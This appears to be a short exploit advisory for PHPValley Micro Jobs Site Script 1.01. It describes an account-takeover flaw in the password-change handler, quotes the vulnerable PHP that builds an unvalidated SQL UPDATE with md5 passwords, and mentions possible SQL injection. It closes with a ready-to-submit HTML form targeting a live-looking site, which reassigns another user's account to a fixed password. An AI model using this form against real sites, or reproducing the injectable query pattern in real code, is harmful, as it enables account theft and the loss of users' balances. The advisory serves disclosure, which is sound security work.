PacketStorm: exploitdev
Email: exploitdevj@gmail.com

Target Software: PHPValley Micro Jobs Site Script 1.01
Vendor URL: http://phpvalley.com/
Demo: http://phpvalley.com/demo

Account Takeover Vulnerability

This vulnerability allows users to edit their username, which the script
doesn&#039;t account for. Editing your username to that of a current user allows
the attacker to takeover their account, including using or depositing their
balance.

The vulnerability exists in php/change_pass_content.php:
if (isset($_POST[&#039;changepass&#039;]))
{
$cpass=md5($_POST[&#039;cpass&#039;]);
$npass=trim($_POST[&#039;npass&#039;]);
$npassc=trim($_POST[&#039;npassc&#039;]);
$username=trim(strtolower($_POST[&#039;auser&#039;]));
if($npass == $npassc && !empty($npass)){
$query = "UPDATE members SET username=&#039;".$username."&#039;,
password=&#039;".md5(strtolower($npass))."&#039; where
username=&#039;".$_SESSION[&#039;userName&#039;]."&#039; and password=&#039;$cpass&#039;";
 This code doesn&#039;t validate the username that is being updated. SQL
injection might also be possible, but the length is limited here.

Exploit:
<!-- be logged into your own account, edit info below: -->
<form method="post" action="http://webfiver.com/change_pass.php">
<input name="changepass" type="hidden" value="Update" />
Target Username: <input name="auser" type="text" />
Your Password:   <input name="cpass" type="password" />
 <input name="npass" type="hidden" value="jacked" />
 <input name="npassc" type="hidden" value="jacked" />
 <input type="submit" value="Jack" />
</form>

